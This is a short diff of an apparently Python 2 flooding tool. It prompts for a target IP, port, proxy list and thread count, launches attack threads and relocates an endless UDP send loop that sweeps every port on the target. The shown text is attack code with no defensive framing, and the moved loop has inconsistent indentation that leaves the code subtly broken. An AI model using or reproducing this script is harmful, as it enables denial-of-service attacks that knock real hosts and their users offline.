@@ -341,12 +341,6 @@ in_file.close()
 ip = raw_input("IP Target : ")
 port = input("Port : ")
 
-while True:
-     sock.sendto(bytes, (ip,port))
-     port = port + 1
-     if port == 65534:
-       port = 1
-
 listaproxy = proxyf.split('\n')
 #So luong
 thread = input("Power ( 1000 ) : ") 
@@ -359,6 +353,13 @@ x = 0
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
+	
+	while True:
+     sock.sendto(bytes, (ip,port))
+     port = port + 1
+     if port == 65534:
+       port = 1
+
 print "Program Started..."
 print "Good Luck..."
 print "Ctrl + Z Stop Program..."
